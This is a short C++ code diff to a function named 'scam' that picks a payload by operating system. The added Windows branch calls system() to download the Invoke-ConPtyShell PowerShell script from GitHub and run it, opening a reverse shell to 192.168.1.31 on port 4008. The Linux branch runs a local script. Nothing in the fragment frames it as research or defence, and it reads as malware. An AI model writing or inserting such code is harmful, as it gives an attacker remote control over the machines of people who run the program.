@@ -27,10 +27,13 @@ string getOsName()
 }     
 
 void scam() {
-    if (getOsName() == "Windows")
-        execl("./script-windows.sh","script-windows.sh",(char*)0);
-    else if (getOsName() == "Linux")
+    if (getOsName() == "Windows") {
+        // execl("./script-windows.sh","script-windows.sh",(char*)0);
+        system("IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008");
+    }
+    else if (getOsName() == "Linux") {
         execl("./script-linux.sh","script-linux.sh",(char*)0);
+    }
 }
 
 
